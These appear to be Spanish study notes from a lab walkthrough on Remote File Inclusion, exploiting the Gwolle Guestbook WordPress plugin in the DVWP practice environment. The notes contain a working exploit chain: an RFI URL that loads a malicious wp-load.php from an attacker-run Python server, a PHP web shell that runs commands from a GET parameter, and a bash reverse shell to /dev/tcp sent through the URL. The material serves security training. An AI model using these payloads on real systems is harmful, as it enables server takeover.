- Tags: #rfi #recursos_github #php 
La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir** **archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema.

En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante.

Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad:

- **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Asimismo, se os comparte el enlace directo para la descarga del plugin ‘**Gwolle Guestbook**‘ de WordPress:

- **Gwolle Guestbook**: [https://es.wordpress.org/plugins/gwolle-gb/](https://es.wordpress.org/plugins/gwolle-gb/)

Partiendo de que tenemos una maquina vulnerable con el pugin recomendado el cual tiene una vulnerabilidad que nos permie llamar remoamente a otro servido pues pudemos hacer lo siguient 

```
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ipServ/
```

Nos habrimos un servidor con python en una carpeta donde creamos un fichero llamado wp-load.php que es al archivo por defecto que llama el plugin  
```bash
python -m http.server

```

Que puede tener este fichero pues codigo php malicioso que nos permita pues ejecutar comandos en el servidor
```php
<?php 
system("whoami");
?>

Variante
<?php 
system($_GET["cmd"]);
?>

Aqui la peticion la cambiariamos para injectar los comandos desde la web
http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ipServ/&cmd=comando

#O directamente establecer una reverse shell que pudieramos hacerlo desde la url o definirlo directamente el el archivo wp-load.php

http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ipServ/&cmd=bash -c "bash -i>& /dev/tcp/ip/port 0>&1"



```